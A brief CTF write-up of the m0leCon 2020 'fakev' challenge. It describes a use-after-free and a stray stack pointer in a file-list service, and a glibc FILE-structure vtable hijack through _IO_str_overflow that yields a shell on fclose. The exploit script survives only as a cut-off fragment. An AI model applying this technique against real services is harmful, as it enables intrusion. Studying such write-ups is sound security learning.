# m0leCon CTF 2020 Teaser

## fakev

This challenge was solved by [@korniltsev](https://ctftime.org/user/54962), [@mostobriv](https://ctftime.org/user/25913), [@n00bie](https://ctftime.org/user/50936) and me.

Writeup will not be super detailed, but rather brief overview of the solution.

`fakev` service allows us to open up to 9 files which are organized into a linked list of the following structure:

```cpp
struct node_t {
    FILE *file;
    struct node_t *next;
};
```

Where `file` is a pointer into the file structure of the corresponding file. Also, we're able to close and read content of these files (write isn't implemented).

Basically, there are 2 vulns. The first one is UAF in reading file content (we can read the file content of the already closed file). The second one is placed inside of `add` function. When we create 9th file, service allocates new `struct node_t` for this file, but doesn't use it. Instead, it assigns stack address into `next` field of the previously opened file:

```cpp
  new_node = (node_t *)malloc(0x10uLL);
  if ( !new_node )
  {
    perror("Couldn't alloc");
    exit(1);
  }
  node->next = (node_t *)&stack;                // set next to stack
  node->next->file = (_QWORD *)fp;
  node->next->next = 0LL;
```

If we can control stack value, then we're able to change `next` into controlled `struct node_t` with controlled `file` field. In `get_int` function input that user supplies is then saved into the global variable (address of this variable is known because of disabled `PIE`). 

Hence, attack vector is the next:

1. Leak libc address (will be explained below)
2. Change `next` field of the last opened file with the controlled one (already explained)
3. Point `file` into global variable which is controlled (already explained)
4. Call `fclose` on the `fake file` and get the shell (will be explained below).

The rest we need to do is to leak libc address and hijack the control flow when `fclose` is called on the fake file struct. Libc leaking can be done by filling up `tcache[0xf0]` and then using the first vuln (UAF in reading) to read content of the freed unsorted bin chunk.

Controlling the program flow after `fclose` is called can be done by forging the vtable of the fake file struct. Of course, we can't just point it to any fake vtable because of `_IO_vtable_check`. Fake vtable should be placed inside of libc vtable section. After searching for the right function, we're faced with `_IO_str_overflow`. Just satisfy the requirements and call arbitrary code with controlled `rdi`.

```python

    else:
        io.sendlineafter(':', str(idx))
